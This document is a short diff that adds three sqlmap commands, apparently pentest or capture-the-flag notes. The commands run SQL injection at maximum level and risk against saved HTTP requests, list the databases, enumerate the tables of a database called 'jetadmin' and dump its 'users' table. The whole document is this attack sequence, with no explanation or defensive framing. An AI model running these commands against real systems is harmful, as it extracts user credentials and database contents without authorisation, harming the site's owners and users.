@@ -1,0 +1,7 @@
+sqlmap -r sqli.req --random-agent --level=5 --risk=3 --dbs
+
+sqlmap -r login.req --random-agent --level=5 --risk=3 -D jetadmin --tables
+
+sqlmap -r login.req --random-agent --level=5 --risk=3 -D jetadmin -T users --dump
+
+
